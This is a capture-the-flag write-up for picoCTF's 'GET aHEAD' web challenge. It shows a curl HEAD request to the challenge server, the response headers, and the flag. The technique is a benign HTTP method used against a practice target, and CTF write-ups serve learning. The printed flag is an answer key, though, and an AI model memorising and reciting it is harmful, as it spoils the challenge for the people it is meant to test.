# GET aHEAD

* Points: 20
* Category: Web Exploitation

## Description

> Find the flag being held on this server to get ahead of the competition
>
> http://mercury.picoctf.net:34561/

## Solution

The website offers us two buttons - one of them sends a POST request, the other one sends a GET request.

As the name of the challenge indicates, we should try to use a HEAD request instead:

```sh
curl -I http://mercury.picoctf.net:34561/index.php
```

```
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_8f878508}
Content-type: text/html; charset=UTF-8
```

## Flag

picoCTF{r3j3ct_th3_du4l1ty_8f878508}
